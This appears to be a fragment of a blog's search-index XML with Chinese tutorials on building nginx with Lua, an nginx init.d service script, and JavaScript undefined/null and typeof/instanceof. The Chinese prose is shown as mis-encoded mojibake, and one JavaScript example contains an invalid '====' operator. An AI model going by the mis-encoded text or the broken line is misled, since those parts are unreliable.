--with-ld-opt=&quot;-Wl,-rpath,/usr/local/luajit/lib&quot; \</span><br><span class="line">    --add-module=/path/to/ngx_devel_kit \</span><br><span class="line">    --add-module=/path/to/lua-nginx-module</span><br><span class="line"></span><br><span class="line">make -j2</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><blockquote><p>å’Œæ­£å¸¸ç¼–è¯‘nginxå·®åˆ«ä¸å¤§ï¼Œå¤šäº†ç‚¹luaç¯å¢ƒçš„é…ç½®</p></blockquote><h3 id="å¸¸è§é—®é¢˜"><a href="#å¸¸è§é—®é¢˜" class="headerlink" title="å¸¸è§é—®é¢˜"></a>å¸¸è§é—®é¢˜</h3><h4 id="ç¼ºå°‘pcreæ¨¡å—"><a href="#ç¼ºå°‘pcreæ¨¡å—" class="headerlink" title="ç¼ºå°‘pcreæ¨¡å—"></a>ç¼ºå°‘pcreæ¨¡å—</h4><p><a href="http://www.linuxfromscratch.org/blfs/view/svn/general/pcre.html">å®‰è£…æ–‡æ¡£</a>      </p><blockquote><p><a href="http://www.micmiu.com/enterprise-app/server/nginx-libpcre-so-1/">http://www.micmiu.com/enterprise-app/server/nginx-libpcre-so-1/</a><br>ç¼ºå°‘å¤´æ–‡ä»¶ <code>yum whatprovides */bzlib.h</code> æœç´¢ã€å®‰è£…</p></blockquote><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://blog.csdn.net/guowenyan001/article/details/48250427">ã€1ã€‘</a> <a href="https://github.com/openresty/lua-nginx-module#installation">ã€2ã€‘</a> <a href="http://openresty.org/cn/linux-packages.html">ã€3ã€‘</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
            <tag> openresty </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginxå¼€æœºå¯åŠ¨</title>
      <link href="/post/nginx-as-service.html"/>
      <url>/post/nginx-as-service.html</url>
      
        <content type="html"><![CDATA[<h3 id="å¼€æœºå¯åŠ¨Nginx"><a href="#å¼€æœºå¯åŠ¨Nginx" class="headerlink" title="å¼€æœºå¯åŠ¨Nginx"></a>å¼€æœºå¯åŠ¨Nginx</h3><p>æ–°å»ºnginxå¼€æœºå¯åŠ¨é…ç½®æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/init.d/nginx</span><br></pre></td></tr></table></figure><p>å¯åŠ¨è„šæœ¬</p><blockquote><p>nginxdã€nginx_configç­‰æ ¹æ®å®é™…ä½ç½®éœ€è¦ä¿®æ”¹</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/sh</span></span><br><span class="line"><span class="comment"># chkconfig:         2345 80 20</span></span><br><span class="line"><span class="comment"># description:       Starts and stops a single nginx instance on this system</span></span><br><span class="line"><span class="comment"># Default-Start:     2 3 4 5</span></span><br><span class="line"><span class="comment"># Default-Stop:      0 1 6</span></span><br><span class="line"><span class="comment"># Short-Description: starts the nginx web server</span></span><br><span class="line"></span><br><span class="line">PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin</span><br><span class="line">DESC=<span class="string">&quot;nginx daemon&quot;</span></span><br><span class="line">NAME=nginx</span><br><span class="line">DAEMON=/usr/local/nginx/sbin/<span class="variable">$NAME</span></span><br><span class="line">CONFIGFILE=/usr/local/nginx/conf/<span class="variable">$NAME</span>.conf</span><br><span class="line">PIDFILE=/usr/local/nginx/logs/<span class="variable">$NAME</span>.pid</span><br><span class="line">SCRIPTNAME=/etc/init.d/<span class="variable">$NAME</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> -e</span><br><span class="line">[ -x <span class="string">&quot;<span class="variable">$DAEMON</span>&quot;</span> ] || <span class="built_in">exit</span> 0</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">do_start</span></span>() &#123;</span><br><span class="line">     <span class="variable">$DAEMON</span> -c <span class="variable">$CONFIGFILE</span> || <span class="built_in">echo</span> -n <span class="string">&quot;nginx already running&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">do_stop</span></span>() &#123;</span><br><span class="line">     <span class="built_in">kill</span> -INT `<span class="built_in">cat</span> <span class="variable">$PIDFILE</span>` || <span class="built_in">echo</span> -n <span class="string">&quot;nginx not running&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">do_reload</span></span>() &#123;</span><br><span class="line">     <span class="built_in">kill</span> -HUP `<span class="built_in">cat</span> <span class="variable">$PIDFILE</span>` || <span class="built_in">echo</span> -n <span class="string">&quot;nginx can&#x27;t reload&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="string">&quot;<span class="variable">$1</span>&quot;</span> <span class="keyword">in</span></span><br><span class="line">    start)</span><br><span class="line">        <span class="built_in">echo</span> -n <span class="string">&quot;Starting <span class="variable">$DESC</span>: <span class="variable">$NAME</span>&quot;</span></span><br><span class="line">        do_start</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;.&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">    stop)</span><br><span class="line">        <span class="built_in">echo</span> -n <span class="string">&quot;Stopping <span class="variable">$DESC</span>: <span class="variable">$NAME</span>&quot;</span></span><br><span class="line">        do_stop</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;.&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">    reload|graceful)</span><br><span class="line">        <span class="built_in">echo</span> -n <span class="string">&quot;Reloading <span class="variable">$DESC</span> configuration...&quot;</span></span><br><span class="line">        do_reload</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;.&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">    restart)</span><br><span class="line">        <span class="built_in">echo</span> -n <span class="string">&quot;Restarting <span class="variable">$DESC</span>: <span class="variable">$NAME</span>&quot;</span></span><br><span class="line">        do_stop</span><br><span class="line">        do_start</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;.&quot;</span></span><br><span class="line">        ;;</span><br><span class="line">    *)</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$SCRIPTNAME</span> &#123;start|stop|reload|restart&#125;&quot;</span> &gt;&amp;2</span><br><span class="line">        <span class="built_in">exit</span> 3</span><br><span class="line">        ;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">exit</span> 0</span><br></pre></td></tr></table></figure><p>æ³¨å†Œå¼€æœºå¯åŠ¨æœåŠ¡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chmod a+x /etc/init.d/nginx</span><br><span class="line"></span><br><span class="line">chkconfig --add nginx</span><br><span class="line">chkconfig --level 2345 nginx on</span><br></pre></td></tr></table></figure><h3 id="æ³¨æ„äº‹é¡¹"><a href="#æ³¨æ„äº‹é¡¹" class="headerlink" title="æ³¨æ„äº‹é¡¹"></a>æ³¨æ„äº‹é¡¹</h3><p>æœ‰æ—¶é—´è¿è¡Œchkconfig â€“add æ—¶ä¼šæŠ¥<code>æœåŠ¡ä¸æ”¯æŒ chkconfig</code>é”™è¯¯ï¼Œè¿™ç§æƒ…å†µä¸‹éœ€è¦åœ¨è„šæœ¬ä¸Šé¢æ·»åŠ ä¸‹é¢ä¿©ä¸ªé…ç½®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># chkconfig:         2345 80 20</span><br><span class="line"># description:       Starts and stops a single nginx instance on this system</span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://blog.csdn.net/gebitan505/article/details/17606735">nginxå¼€æœºè‡ªåŠ¨å¯åŠ¨è„šæœ¬</a></li><li><a href="http://www.cnblogs.com/meteoric_cry/archive/2011/01/27/1945882.html">Linuxä¸‹çš„Nginxå®‰è£…(å¼€æœºè‡ªå¯åŠ¨)</a> </li><li><a href="http://blog.csdn.net/blueman2012/article/details/6706572">æœåŠ¡ä¸æ”¯æŒ chkconfigã€€çš„è§£å†³æ–¹æ³•</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>undefined</title>
      <link href="/post/undefined.html"/>
      <url>/post/undefined.html</url>
      
        <content type="html"><![CDATA[<h2 id="undefined"><a href="#undefined" class="headerlink" title="undefined"></a>undefined</h2><h3 id="åˆ¤æ–­å¯¹è±¡æ˜¯ä¸æ˜¯undefined"><a href="#åˆ¤æ–­å¯¹è±¡æ˜¯ä¸æ˜¯undefined" class="headerlink" title="åˆ¤æ–­å¯¹è±¡æ˜¯ä¸æ˜¯undefined"></a>åˆ¤æ–­å¯¹è±¡æ˜¯ä¸æ˜¯<code>undefined</code></h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ–¹æ³•ä¸€</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">typeof</span> x === <span class="string">&#x27;undefined&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ–¹æ³•äºŒ</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(x === <span class="literal">undefined</span>);</span><br></pre></td></tr></table></figure><p>ä¸è¦ä½¿ç”¨<code>==</code>æ¯”è¾ƒï¼Œå› ä¸º<code>null == undefined</code>ä¸ºtrueã€‚</p><h3 id="undefined-null"><a href="#undefined-null" class="headerlink" title="undefined &amp; null"></a>undefined &amp; null</h3><p>å¾ˆå¤šæ—¶å€™<code>undefined</code>å’Œ<code>null</code>å·®åˆ«ä¸å¤§ï¼Œä½†æ˜¯äºŒè€…çš„<strong>å«ä¹‰</strong>å®Œå…¨ä¸åŒã€‚</p><p><code>undefined</code>ä»£è¡¨<strong>æœªå®šä¹‰</strong>ï¼Œè€Œnullä»£è¡¨<strong>å€¼ä¸ºç©º</strong>ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typeof</span> <span class="literal">undefined</span>;    <span class="comment">// &#x27;undefined&#x27;</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">null</span>;         <span class="comment">// &#x27;object&#x27;</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°<code>null</code>çš„ç±»å‹æ˜¯<code>object</code>ï¼Œå®ƒè¡¨ç¤ºçš„æ„æ€æ˜¯ä¸€ä¸ªä¸ºç©ºçš„å€¼ã€‚</p><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a href="http://www.ruanyifeng.com/blog/2014/03/undefined-vs-null.html">undefinedä¸nullçš„åŒºåˆ«</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> undefined </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>typeofå’Œinstanceof</title>
      <link href="/post/typeof-instanceof.html"/>
      <url>/post/typeof-instanceof.html</url>
      
        <content type="html"><![CDATA[<p><code>typeof</code>å’Œ<code>instanceof</code>æ˜¯JavaScriptä¸­çš„ä¸¤ä¸ªæ“ä½œç¬¦ã€‚ä¸€èˆ¬æƒ…å†µä¸‹å¯¹äºåŸºæœ¬ç±»å‹æˆ‘ä»¬ä½¿ç”¨<code>typeof</code>ï¼Œå¯¹äºå¯¹è±¡çš„å…·ä½“ç±»å‹ç”¨<code>instanceof</code>ã€‚</p><h3 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h3><p><code>typeof</code>æ“ä½œç¬¦è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²,è¡¨ç¤ºæœªç»æ±‚å€¼çš„æ“ä½œæ•°(unevaluated operand)çš„ç±»å‹ã€‚<br>ä¸‹é¢çš„è¡¨æ ¼æ€»ç»“äº† typeof å¯èƒ½çš„è¿”å›å€¼ã€‚<br><img src="/images/QQ20160824-0@2x.jpg"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Numbers</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="number">37</span> === <span class="string">&#x27;number&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> <span class="number">3.14</span> === <span class="string">&#x27;number&#x27;</span>;</span><br><span class="line"><span class="title function_">typeof</span>(<span class="number">42</span>) === <span class="string">&#x27;number&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> <span class="title class_">Math</span>.<span class="property">LN2</span> === <span class="string">&#x27;number&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> <span class="title class_">Infinity</span> === <span class="string">&#x27;number&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> <span class="title class_">NaN</span> === <span class="string">&#x27;number&#x27;</span>; <span class="comment">// Despite being &quot;Not-A-Number&quot;</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="title class_">Number</span>(<span class="number">1</span>) === <span class="string">&#x27;number&#x27;</span>; <span class="comment">// but never use this form!</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Strings</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="string">&#x27;&#x27;</span> === <span class="string">&#x27;string&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> <span class="string">&#x27;bla&#x27;</span> === <span class="string">&#x27;string&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> <span class="string">&#x27;1&#x27;</span> === <span class="string">&#x27;string&#x27;</span>; <span class="comment">// note that a number within a string is still typeof string</span></span><br><span class="line"><span class="title function_">typeof</span> (<span class="keyword">typeof</span> <span class="number">1</span>) === <span class="string">&#x27;string&#x27;</span>; <span class="comment">// typeof always returns a string</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="title class_">String</span>(<span class="string">&#x27;abc&#x27;</span>) === <span class="string">&#x27;string&#x27;</span>; <span class="comment">// but never use this form!</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Booleans</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">true</span> === <span class="string">&#x27;boolean&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">false</span> === <span class="string">&#x27;boolean&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> <span class="title class_">Boolean</span>(<span class="literal">true</span>) === <span class="string">&#x27;boolean&#x27;</span>; <span class="comment">// but never use this form!</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Symbols</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="title class_">Symbol</span>() === <span class="string">&#x27;symbol&#x27;</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="title class_">Symbol</span>(<span class="string">&#x27;foo&#x27;</span>) === <span class="string">&#x27;symbol&#x27;</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="title class_">Symbol</span>.<span class="property">iterator</span> === <span class="string">&#x27;symbol&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Undefined</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">undefined</span> === <span class="string">&#x27;undefined&#x27;</span>;</span><br><span class="line"><span class="comment">// å®šä¹‰ä¸ºåˆå§‹åŒ–</span></span><br><span class="line"><span class="keyword">typeof</span> declaredButUndefinedVariable === <span class="string">&#x27;undefined&#x27;</span>;</span><br><span class="line"><span class="comment">// æœªå®šä¹‰</span></span><br><span class="line"><span class="keyword">typeof</span> undeclaredVariable === <span class="string">&#x27;undefined&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Objects</span></span><br><span class="line"><span class="keyword">typeof</span> &#123;<span class="attr">a</span>: <span class="number">1</span>&#125; === <span class="string">&#x27;object&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// use Array.isArray or Object.prototype.toString.call</span></span><br><span class="line"><span class="comment">// to differentiate regular objects from arrays</span></span><br><span class="line"><span class="keyword">typeof</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">4</span>] === <span class="string">&#x27;object&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="title class_">Date</span>() === <span class="string">&#x27;object&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// The following is confusing. Don&#x27;t use!</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="title class_">Boolean</span>(<span class="literal">true</span>) === <span class="string">&#x27;object&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="title class_">Number</span>(<span class="number">1</span>) === <span class="string">&#x27;object&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&#x27;abc&#x27;</span>) === <span class="string">&#x27;object&#x27;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Functions</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125; === <span class="string">&#x27;function&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">class</span> <span class="title class_">C</span> &#123;&#125; === <span class="string">&#x27;function&#x27;</span>;</span><br><span class="line"><span class="keyword">typeof</span> <span class="title class_">Math</span>.<span class="property">sin</span> === <span class="string">&#x27;function&#x27;</span>;</span><br></pre></td></tr></table></figure><p>æ³¨æ„äº‹é¡¹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// null is a null Object</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="literal">null</span> === <span class="string">&#x27;object&#x27;</span>; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typeof</span> <span class="title class_">NaN</span> === <span class="string">&#x27;number&#x27;</span>; <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å…¶å®ƒéƒ½æ˜¯object</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="title class_">Date</span>() === <span class="string">&#x27;object&#x27;</span>; <span class="comment">// true</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="title class_">Boolean</span>(<span class="literal">true</span>) === <span class="string">&#x27;object&#x27;</span>; <span class="comment">// true</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="title class_">Number</span>(<span class="number">1</span>) ==== <span class="string">&#x27;object&#x27;</span>; <span class="comment">// true</span></span><br><span class="line"><span class="keyword">typeof</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;abc&quot;</span>) === <span class="string">&#x27;object&#x27;</span>; <span class="comment">// true</span></span><br></pre></td></tr></table></figure><h3 id="instanceof"><a href="#instanceof" class="headerlink" title="instanceof"></a>instanceof</h3><p><code>instanceof</code>è¿ç®—ç¬¦å¯ä»¥ç”¨æ¥åˆ¤æ–­æŸä¸ªæ„é€ å‡½æ•°çš„<code>prototype</code>å±æ€§æ‰€æŒ‡å‘çš„å°è±¡æ˜¯å¦å­˜åœ¨äºå¦å¤–ä¸€ä¸ªè¦æ£€æµ‹å¯¹è±¡çš„åŸå‹é“¾ä¸Šã€‚</p><p><code>instanceof</code>è¿ç®—ç¬¦å¸Œæœ›å·¦æ“ä½œæ•°æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå³æ“ä½œæ•°æ ‡è¯†å¯¹è±¡çš„ç±»ã€‚å¦‚æœå·¦ä¾§çš„å¯¹è±¡æ˜¯å³ä¾§ç±»çš„å®ä¾‹ï¼Œåˆ™è¡¨è¾¾å¼è¿”å›trueï¼›å¦åˆ™è¿”å›falseã€‚</p><p>ä¸ºäº†è®¡ç®—è¡¨è¾¾å¼<code>o instanceof f</code>ï¼ŒJavaScripté¦–å…ˆè®¡ç®—<code>f.prototype</code>ï¼Œç„¶ååœ¨åŸå‹é“¾ä¸­æŸ¥æ‰¾oï¼Œå¦‚æœæ‰¾åˆ°ï¼Œé‚£ä¹ˆoæ˜¯fï¼ˆæˆ–è€…fçš„çˆ¶ç±»ï¼‰çš„ä¸€ä¸ªå®ä¾‹ï¼Œè¡¨è¾¾å¼è¿”å›trueã€‚å¦‚æœf.prototypeä¸åœ¨oçš„åŸå‹é“¾ä¸­çš„è¯ï¼Œé‚£ä¹ˆoå°±ä¸æ˜¯fçš„å®ä¾‹ï¼Œinstanceofè¿”å›falseã€‚</p><p>åŸå‹é“¾<br><img src="/images/1374057134_4751.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Foo</span>(<span class="params">y</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">y</span> = y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">x</span> = <span class="number">10</span>;</span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">calculate</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// ... </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> b = <span class="keyword">new</span> <span class="title class_">Foo</span>(<span class="number">20</span>);</span><br><span class="line"><span class="keyword">var</span> c = <span class="keyword">new</span> <span class="title class_">Foo</span>(<span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">b.<span class="property">__proto__</span> === <span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>; <span class="comment">// true </span></span><br><span class="line">b.<span class="property">__proto__</span> === <span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(b); <span class="comment">// true </span></span><br><span class="line"></span><br><span class="line">b <span class="keyword">instanceof</span> <span class="title class_">Foo</span>; <span class="comment">// true </span></span><br><span class="line"><span class="title class_">Foo</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="title function_">isPrototypeOf</span>(b); <span class="comment">// true </span></span><br></pre></td></tr></table></figure><p>JavaScriptä¸­æœ‰ä¸ªåŸå‹é“¾çš„æ¦‚å¿µï¼Œè¿™ä¸ª<code>é“¾</code>ä¸€èˆ¬æ˜¯é€šè¿‡å¯¹è±¡çš„<code>__proto__</code>å±æ€§æ¥å»ºç«‹çš„ã€‚<code>prototype</code>ä»£è¡¨åŸå‹ï¼Œ<code>prototype</code>å¯¹è±¡éƒ½æœ‰ä¸€ä¸ª<code>constructor</code>å±æ€§ï¼ŒæŒ‡å‘å®ƒçš„æ„é€ å‡½æ•°ã€‚è¿™é‡Œçš„<code>instanceof</code>å°±æ˜¯å»åˆ¤æ–­æ˜¯å¦åœ¨ä¸€æ¡åŸå‹é“¾ä¸Šã€‚</p><h3 id="Object-prototype-toString"><a href="#Object-prototype-toString" class="headerlink" title="Object.prototype.toString()"></a>Object.prototype.toString()</h3><p>æ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ª<code>toString()</code>æ–¹æ³•ï¼Œå½“è¯¥å¯¹è±¡è¢«è¡¨ç¤ºä¸ºä¸€ä¸ªæ–‡æœ¬å€¼æ—¶ï¼Œæˆ–è€…ä¸€ä¸ªå¯¹è±¡ä»¥é¢„æœŸçš„å­—ç¬¦ä¸²æ–¹å¼å¼•ç”¨æ—¶è‡ªåŠ¨è°ƒç”¨ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œ<code>toString()</code>æ–¹æ³•è¢«æ¯ä¸ª<code>Object</code>å¯¹è±¡ç»§æ‰¿ã€‚å¦‚æœæ­¤æ–¹æ³•åœ¨è‡ªå®šä¹‰å¯¹è±¡ä¸­æœªè¢«è¦†ç›–ï¼Œ<code>toString()</code> è¿”å› <code>[object type]</code>ï¼Œå…¶ä¸­<code>type</code>æ˜¯å¯¹è±¡çš„ç±»å‹ã€‚ä»¥ä¸‹ä»£ç è¯´æ˜äº†è¿™ä¸€ç‚¹ï¼š</p><p>å¯ä»¥é€šè¿‡<code>toString()</code> æ¥è·å–æ¯ä¸ªå¯¹è±¡çš„ç±»å‹ã€‚ä¸ºäº†æ¯ä¸ªå¯¹è±¡éƒ½èƒ½é€šè¿‡ <code>Object.prototype.toString()</code> ï¼ˆé¿å…å‡ºç° null.toString() å’Œ undefined.toString() çš„æƒ…å†µï¼‰æ¥æ£€æµ‹ï¼Œéœ€è¦ä»¥ <code>Function.prototype.call()</code> æˆ–è€… <code>Function.prototype.apply()</code> çš„å½¢å¼æ¥è°ƒç”¨ï¼Œä¼ é€’è¦æ£€æŸ¥çš„å¯¹è±¡ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ï¼Œç§°ä¸º<code>thisArg</code>ã€‚</p><blockquote><p>Object.prototype.toString.call(v);</p></blockquote><table><thead><tr><th>ç±»å‹</th><th>toString</th></tr></thead><tbody><tr><td>Undefined</td><td>[object Undefined]</td></tr><tr><td>Null</td><td>[object Null]</td></tr><tr><td>Boolean</td><td>[object Boolean]</td></tr><tr><td>Number</td><td>[object Number]</td></tr><tr><td>String</td><td>[object String]</td></tr><tr><td>Symbol</td><td>[object Symbol]</td></tr><tr><td>Object</td><td>[object Object]</td></tr><tr><td>-</td><td>-</td></tr><tr><td>Function</td><td>[object Function]</td></tr><tr><td>Array</td><td>[object Array]</td></tr><tr><td>Date</td><td>[object Date]</td></tr><tr><td>RegExp</td><td>[object RegExp]</td></tr></tbody></table><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><ul><li><a 